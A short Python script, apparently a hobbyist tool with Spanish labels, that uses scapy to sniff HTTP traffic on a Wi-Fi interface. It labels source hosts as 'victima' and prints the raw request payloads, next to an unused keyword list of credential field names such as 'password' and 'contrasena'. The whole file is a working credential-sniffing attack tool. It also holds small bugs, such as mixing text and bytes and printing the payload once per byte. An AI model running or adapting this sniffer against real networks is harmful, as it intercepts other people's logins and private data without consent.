# _*_ coding: utf8 _*_

from scapy.all import *
from scapy_http import http
from colorama import Fore, init

init()

wordlist = ["username", "user", "email",
            "usuario", "password", "passwd", "contrasena"]


def captura_http(packet):
    if packet.haslayer(http.HTTPRequest):
        iporigen=bytes(packet[IP].src,  encoding='utf8')
        ipdestino=bytes(packet[IP].dst, encoding='utf8')
        host = packet[http.HTTPRequest].Host

        print(b"[+] victima: " + iporigen + b" IP DESTINO: " + ipdestino + b" DOMINIO: " + host)
        if packet.haslayer(Raw):
            load = packet[Raw].load
            load = load.lower()
            for e in load:
                print(Fore.LIGHTRED_EX + " DATO ENCONTRADO: " + load)


def main():
    print(
        "...[{}+{}] capturando paquetes...".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
    sniff(iface="Wi-Fi", store=False, prn=captura_http)


if __name__ == "__main__":
    main()
